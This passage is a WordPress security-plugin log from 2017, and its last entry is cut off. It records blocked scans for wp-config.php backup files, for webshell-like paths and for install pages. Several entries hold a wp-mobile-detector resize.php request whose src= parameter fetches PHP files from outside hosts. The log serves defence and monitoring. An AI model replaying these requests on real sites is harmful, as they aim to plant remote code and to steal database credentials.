+Host Name: 37.1.204.92
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: http://whatsmycut.com/wp-config.php.bak
+REQUEST_URI: /wp-config.php.bak
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)
+
+[403 GET Request: July 7, 2017 - 9:21 am]
+BPS: 2.1
+WP: 4.8
+Event Code: PSBR-HPRA
+Solution: https://forum.ait-pro.com/forums/topic/security-log-event-codes/
+REMOTE_ADDR: 201.18.18.173
+Host Name: 201.18.18.173
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: //wp-content/plugins/wp-mobile-detector/resize.php?src=http://www.laptopscreenrepair.net.au/search/cache.php
+QUERY_STRING: src=http://www.laptopscreenrepair.net.au/search/cache.php
+HTTP_USER_AGENT: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:50.0) Gecko/20100101 Firefox/50.0
+
+[403 POST Request: July 8, 2017 - 1:23 am]
+BPS: 2.1
+WP: 4.8
+Event Code: BFHS - Blocked/Forbidden Hacker or Spammer
+Solution: N/A - Hacker/Spammer Blocked/Forbidden
+REMOTE_ADDR: 185.129.148.181
+Host Name: 185.129.148.181
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /wp-includes/theme-compat/files.php
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/5.0 (Windows NT 6.1; rv:34.0) Gecko/20100101 Firefox/34.0
+REQUEST BODY: BPS Security Log option set to: Do Not Log POST Request Body Data
+
+[403 GET Request: July 9, 2017 - 6:05 am]
+BPS: 2.1
+WP: 4.8
+Event Code: BFHS - Blocked/Forbidden Hacker or Spammer
+Solution: N/A - Hacker/Spammer Blocked/Forbidden
+REMOTE_ADDR: 61.158.163.93
+Host Name: 93.163.158.61.ha.cnc
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: http://whatsmycut.com/readme.html
+REQUEST_URI: /readme.html
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)
+
+[403 GET Request: July 9, 2017 - 6:05 am]
+BPS: 2.1
+WP: 4.8
+Event Code: BFHS - Blocked/Forbidden Hacker or Spammer
+Solution: N/A - Hacker/Spammer Blocked/Forbidden
+REMOTE_ADDR: 61.158.163.93
+Host Name: 93.163.158.61.ha.cnc
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: http://whatsmycut.com/readme.html
+REQUEST_URI: /readme.html
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)
+
+[403 GET Request: July 9, 2017 - 6:05 am]
+BPS: 2.1
+WP: 4.8
+Event Code: BFHS - Blocked/Forbidden Hacker or Spammer
+Solution: N/A - Hacker/Spammer Blocked/Forbidden
+REMOTE_ADDR: 61.158.163.93
+Host Name: 93.163.158.61.ha.cnc
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: http://whatsmycut.com/readme.html
+REQUEST_URI: /readme.html
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)
+
+[403 GET Request: July 9, 2017 - 6:06 am]
+BPS: 2.1
+WP: 4.8
+Event Code: BFHS - Blocked/Forbidden Hacker or Spammer
+Solution: N/A - Hacker/Spammer Blocked/Forbidden
+REMOTE_ADDR: 61.158.163.93
+Host Name: 93.163.158.61.ha.cnc
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: http://whatsmycut.com/readme.html
+REQUEST_URI: /readme.html
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)
+
+[403 GET Request: July 9, 2017 - 6:06 am]
+BPS: 2.1
+WP: 4.8
+Event Code: BFHS - Blocked/Forbidden Hacker or Spammer
+Solution: N/A - Hacker/Spammer Blocked/Forbidden
+REMOTE_ADDR: 61.158.163.93
+Host Name: 93.163.158.61.ha.cnc
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: http://whatsmycut.com/readme.html
+REQUEST_URI: /readme.html
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)
+
+[403 GET Request: July 12, 2017 - 9:37 pm]
+BPS: 2.1
+WP: 4.8
+Event Code: PSBR-HPRA
+Solution: https://forum.ait-pro.com/forums/topic/security-log-event-codes/
+REMOTE_ADDR: 201.18.18.173
+Host Name: 201.18.18.173
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /wp-content/plugins/wp-mobile-detector/resize.php?src=http://www.laptopscreenrepair.net.au/search/cache.php
+QUERY_STRING: src=http://www.laptopscreenrepair.net.au/search/cache.php
+HTTP_USER_AGENT: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:50.0) Gecko/20100101 Firefox/50.0
+
+[403 GET Request: July 14, 2017 - 3:17 am]
+BPS: 2.1
+WP: 4.8
+Event Code: PSBR-HPRA
+Solution: https://forum.ait-pro.com/forums/topic/security-log-event-codes/
+REMOTE_ADDR: 201.18.18.173
+Host Name: 201.18.18.173
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /wp-content/plugins/wp-mobile-detector/resize.php?src=http://www.laptopscreenrepair.net.au/search/cache.php
+QUERY_STRING: src=http://www.laptopscreenrepair.net.au/search/cache.php
+HTTP_USER_AGENT: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:50.0) Gecko/20100101 Firefox/50.0
+
+[403 GET Request: July 14, 2017 - 2:37 pm]
+BPS: 2.1
+WP: 4.8
+Event Code: PSBR-HPRA
+Solution: https://forum.ait-pro.com/forums/topic/security-log-event-codes/
+REMOTE_ADDR: 91.236.239.63
+Host Name: mx1.suaspesquisas.com.br
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /wp-content/plugins/wp-mobile-detector/resize.php?src=http://www.relationshiptips.club/cache/db.php
+QUERY_STRING: src=http://www.relationshiptips.club/cache/db.php
+HTTP_USER_AGENT: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.75 Safari/537.36 OPR/36.0.2130.32
+
+[403 GET Request: July 14, 2017 - 3:57 pm]
+BPS: 2.1
+WP: 4.8
+Event Code: PSBR-HPRA
+Solution: https://forum.ait-pro.com/forums/topic/security-log-event-codes/
+REMOTE_ADDR: 91.236.239.63
+Host Name: mx1.suaspesquisas.com.br
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /wp-content/plugins/wp-mobile-detector/resize.php?src=http://www.relationshiptips.club/cache/db.php
+QUERY_STRING: src=http://www.relationshiptips.club/cache/db.php
+HTTP_USER_AGENT: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.75 Safari/537.36 OPR/36.0.2130.32
+
+[403 GET Request: July 14, 2017 - 8:46 pm]
+BPS: 2.1
+WP: 4.8
+Event Code: PSBR-HPRA
+Solution: https://forum.ait-pro.com/forums/topic/security-log-event-codes/
+REMOTE_ADDR: 201.18.18.173
+Host Name: 201.18.18.173
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: //wp-content/plugins/wp-mobile-detector/resize.php?src=http://www.laptopscreenrepair.net.au/search/cache.php
+QUERY_STRING: src=http://www.laptopscreenrepair.net.au/search/cache.php
+HTTP_USER_AGENT: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:50.0) Gecko/20100101 Firefox/50.0
+
+[403 GET Request: July 16, 2017 - 9:08 am]
+BPS: 2.1
+WP: 4.8
+Event Code: WPADMIN-SBR
+Solution: https://forum.ait-pro.com/forums/topic/security-log-event-codes/
+REMOTE_ADDR: 185.100.222.177
+Host Name: 185.100.222.177
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: http://www.google.com/
+REQUEST_URI: //wp-admin/install.php
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:24.0) Gecko/20100101 Firefox/24.0
+
+[403 GET Request: July 16, 2017 - 10:20 am]
+BPS: 2.1
+WP: 4.8
+Event Code: WPADMIN-SBR
+Solution: https://forum.ait-pro.com/forums/topic/security-log-event-codes/
+REMOTE_ADDR: 185.100.222.177
+Host Name: 185.100.222.177
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: http://www.google.com/
+REQUEST_URI: /wp-admin/install.php
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:24.0) Gecko/20100101 Firefox/24.0
+
+[403 POST Request: July 17, 2017 - 11:28 pm]
+BPS: 2.1
+WP: 4.8
+Event Code: BFHS - Blocked/Forbidden Hacker or Spammer
+Solution: N/A - Hacker/Spammer Blocked/Forbidden
+REMOTE_ADDR: 185.129.148.181
+Host Name: 185.129.148.181
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /wp-includes/class.wp-times.php
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/5.0 (Windows NT 6.1; rv:34.0) Gecko/20100101 Firefox/34.0
+REQUEST BODY: BPS Security Log option set to: Do Not Log POST Request Body Data
+
+[403 GET Request: July 18, 2017 - 2:14 pm]
+BPS: 2.2
+WP: 4.8
+Event Code: BFHS - Blocked/Forbidden Hacker or Spammer
+Solution: N/A - Hacker/Spammer Blocked/Forbidden
+REMOTE_ADDR: 81.93.145.100
+Host Name: 81.93.145.100
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: http://whatsmycut.com/wp-includes/system_info.php
+REQUEST_URI: /wp-includes/system_info.php
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/533.4 (KHTML, like Gecko) Chrome/5.0.375.99 Safari/533.4
+
+[403 POST Request: July 19, 2017 - 11:01 am]
+BPS: 2.2
+WP: 4.8
+Event Code: BFHS - Blocked/Forbidden Hacker or Spammer
+Solution: N/A - Hacker/Spammer Blocked/Forbidden
+REMOTE_ADDR: 180.247.233.218
+Host Name: 180.247.233.218
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: http://whatsmycut.com/wp-includes/class.wp-times.php
+REQUEST_URI: /wp-includes/class.wp-times.php
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)
+REQUEST BODY: BPS Security Log option set to: Do Not Log POST Request Body Data
+
+[403 GET Request: July 19, 2017 - 11:39 pm]
+BPS: 2.2
+WP: 4.8
+Event Code: PSBR-HPRA
+Solution: https://forum.ait-pro.com/forums/topic/security-log-event-codes/
+REMOTE_ADDR: 201.18.18.173
+Host Name: 201.18.18.173
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /wp-content/plugins/wp-mobile-detector/resize.php?src=http://www.laptopscreenrepair.net.au/search/cache.php
+QUERY_STRING: src=http://www.laptopscreenrepair.net.au/search/cache.php
+HTTP_USER_AGENT: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:50.0) Gecko/20100101 Firefox/50.0
+
+[403 GET Request: July 20, 2017 - 5:15 pm]
+BPS: 2.2
+WP: 4.8
+Event Code: PSBR-HPRA
+Solution: https://forum.ait-pro.com/forums/topic/security-log-event-codes/
+REMOTE_ADDR: 201.18.18.173
+Host Name: 201.18.18.173
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: //wp-content/plugins/wp-mobile-detector/resize.php?src=http://www.laptopscreenrepair.net.au/search/cache.php
+QUERY_STRING: src=http://www.laptopscreenrepair.net.au/search/cache.php
+HTTP_USER_AGENT: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:50.0) Gecko/20100101 Firefox/50.0
+
+[403 GET Request: July 21, 2017 - 5:36 am]
+BPS: 2.2
+WP: 4.8
+Event Code: BFHS - Blocked/Forbidden Hacker or Spammer
+Solution: N/A - Hacker/Spammer Blocked/Forbidden
+REMOTE_ADDR: 87.229.69.165
+Host Name: c16.maxer.hu
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: http://whatsmycut.com/wp-includes/logo_img.php
+REQUEST_URI: /wp-includes/logo_img.php
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/533.4 (KHTML, like Gecko) Chrome/5.0.375.99 Safari/533.4
+
+[403 GET Request: July 22, 2017 - 2:27 am]
+BPS: 2.2
+WP: 4.8
+Event Code: BFHS - Blocked/Forbidden Hacker or Spammer
+Solution: N/A - Hacker/Spammer Blocked/Forbidden
+REMOTE_ADDR: 159.148.27.165
+Host Name: 159.148.27.165
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: whatsmycut.com
+REQUEST_URI: /wp-includes/wp-caches.php
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.75 Safari/537.36
+
+[403 GET Request: July 24, 2017 - 3:46 pm]
+BPS: 2.2
+WP: 4.8
+Event Code: PSBR-HPRA
+Solution: https://forum.ait-pro.com/forums/topic/security-log-event-codes/
+REMOTE_ADDR: 93.113.206.14
+Host Name: vps-24873.fhnet.fr
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /wp-content/plugins/wp-mobile-detector/resize.php?src=http://www.relationshiptips.club/cache/db.php
+QUERY_STRING: src=http://www.relationshiptips.club/cache/db.php
+HTTP_USER_AGENT: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.75 Safari/537.36 OPR/36.0.2130.32
+
+[403 GET Request: July 24, 2017 - 3:51 pm]
+BPS: 2.2
+WP: 4.8
+Event Code: BFHS - Blocked/Forbidden Hacker or Spammer
+Solution: N/A - Hacker/Spammer Blocked/Forbidden
+REMOTE_ADDR: 37.1.204.92
+Host Name: 37.1.204.92
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: http://whatsmycut.com/wp-config.php.save
+REQUEST_URI: /wp-config.php.save
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)
+
+[403 GET Request: July 24, 2017 - 5:54 pm]
+BPS: 2.2
+WP: 4.8
+Event Code: PSBR-HPRA
+Solution: https://forum.ait-pro.com/forums/topic/security-log-event-codes/
+REMOTE_ADDR: 93.113.206.14
+Host Name: vps-24873.fhnet.fr
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /wp-content/plugins/wp-mobile-detector/resize.php?src=http://www.relationshiptips.club/cache/db.php
+QUERY_STRING: src=http://www.relationshiptips.club/cache/db.php
+HTTP_USER_AGENT: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.75 Safari/537.36 OPR/36.0.2130.32
+
+[403 GET Request: July 25, 2017 - 6:57 pm]
+BPS: 2.2
+WP: 4.8
+Event Code: PSBR-HPRA
+Solution: https://forum.ait-pro.com/forums/topic/security-log-event-codes/
+REMOTE_ADDR: 35.189.196.190
+Host Name: 190.196.189.35.bc.googleusercontent.com
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /wp-content/plugins/wp-mobile-detector/resize.php?src=http://www.relationshiptips.club/cache/db.php
+QUERY_STRING: src=http://www.relationshiptips.club/cache/db.php
+HTTP_USER_AGENT: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.75 Safari/537.36 OPR/36.0.2130.32
+
+[403 GET Request: July 27, 2017 - 9:31 pm]
+BPS: 2.2
+WP: 4.8
+Event Code: PSBR-HPRA
+Solution: https://forum.ait-pro.com/forums/topic/security-log-event-codes/
+REMOTE_ADDR: 201.18.18.173
+Host Name: 201.18.18.173
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /wp-content/plugins/wp-mobile-detector/resize.php?src=http://www.laptopscreenrepair.net.au/search/cache.php
+QUERY_STRING: src=http://www.laptopscreenrepair.net.au/search/cache.php
+HTTP_USER_AGENT: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:50.0) Gecko/20100101 Firefox/50.0
+
+[403 GET Request: August 1, 2017 - 2:30 am]
+BPS: 2.3
+WP: 4.8
+Event Code: BFHS - Blocked/Forbidden Hacker or Spammer
+Solution: N/A - Hacker/Spammer Blocked/Forbidden
+REMOTE_ADDR: 63.230.125.30
+Host Name: 63.230.125.30
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /wp-config.php~
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; rv:11.0) like Gecko
+
+[403 GET Request: August 1, 2017 - 2:30 am]
+BPS: 2.3
+WP: 4.8
+Event Code: BFHS - Blocked/Forbidden Hacker or Spammer
+Solution: N/A - Hacker/Spammer Blocked/Forbidden
+REMOTE_ADDR: 63.230.125.30
+Host Name: 63.230.125.30
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /wp-config.php.bak
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; rv:11.0) like Gecko
+
+[403 GET Request: August 1, 2017 - 2:30 am]
+BPS: 2.3
+WP: 4.8
+Event Code: BFHS - Blocked/Forbidden Hacker or Spammer
+Solution: N/A - Hacker/Spammer Blocked/Forbidden
+REMOTE_ADDR: 63.230.125.30
+Host Name: 63.230.125.30
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /wp-config.php.1
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; rv:11.0) like Gecko
+
+[403 GET Request: August 1, 2017 - 2:30 am]
+BPS: 2.3
+WP: 4.8
+Event Code: BFHS - Blocked/Forbidden Hacker or Spammer
+Solution: N/A - Hacker/Spammer Blocked/Forbidden
+REMOTE_ADDR: 63.230.125.30
+Host Name: 63.230.125.30
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /wp-config.php.old
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; rv:11.0) like Gecko
+
+[403 GET Request: August 1, 2017 - 2:31 am]
+BPS: 2.3
+WP: 4.8
+Event Code: BFHS - Blocked/Forbidden Hacker or Spammer
+Solution: N/A - Hacker/Spammer Blocked/Forbidden
+REMOTE_ADDR: 63.230.125.30
+Host Name: 63.230.125.30
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /wp-config.php.tmp
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; rv:11.0) like Gecko
+
+[BPS Plugin Deactivated:  - ]
+This Security Log entry is created when the BPS plugin is deactivated. An email alert is also sent to you when the BPS plugin is deactivated.
+
+[403 GET Request: August 1, 2017 - 8:14 am]
+BPS: 2.3
+WP: 4.8
+Event Code: BFHS - Blocked/Forbidden Hacker or Spammer
+Solution: N/A - Hacker/Spammer Blocked/Forbidden
+REMOTE_ADDR: 76.76.187.47
+Host Name: 76.76.187.47
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /wp-config.php~
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.153 Safari/537.36
+
+[403 GET Request: August 1, 2017 - 8:15 am]
+BPS: 2.3
+WP: 4.8
+Event Code: BFHS - Blocked/Forbidden Hacker or Spammer
+Solution: N/A - Hacker/Spammer Blocked/Forbidden
+REMOTE_ADDR: 41.252.237.162
+Host Name: 41.252.237.162.ADSL.BNG.dynamic.ltt.ly
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /wp-config.php~
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.153 Safari/537.36
+
+[403 GET Request: August 1, 2017 - 8:15 am]
+BPS: 2.3
+WP: 4.8
+Event Code: BFHS - Blocked/Forbidden Hacker or Spammer
+Solution: N/A - Hacker/Spammer Blocked/Forbidden
+REMOTE_ADDR: 2001:ee0:4041:70cd:2eab:ff:feaf:b982
+Host Name: 2001:ee0:4041:70cd:2eab:ff:feaf:b982
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /wp-config.php.bak
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.153 Safari/537.36
+
+[403 GET Request: August 1, 2017 - 8:15 am]
+BPS: 2.3
+WP: 4.8
+Event Code: BFHS - Blocked/Forbidden Hacker or Spammer
+Solution: N/A - Hacker/Spammer Blocked/Forbidden
+REMOTE_ADDR: 2001:ee0:4041:70cd:2eab:ff:feaf:b982
+Host Name: 2001:ee0:4041:70cd:2eab:ff:feaf:b982
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /wp-config.php.1
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.153 Safari/537.36
+
+[403 GET Request: August 1, 2017 - 8:15 am]
+BPS: 2.3
+WP: 4.8
+Event Code: BFHS - Blocked/Forbidden Hacker or Spammer
+Solution: N/A - Hacker/Spammer Blocked/Forbidden
+REMOTE_ADDR: 2001:ee0:4041:70cd:2eab:ff:feaf:b982
+Host Name: 2001:ee0:4041:70cd:2eab:ff:feaf:b982
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /wp-config.php.old
+QUERY_STRING: 
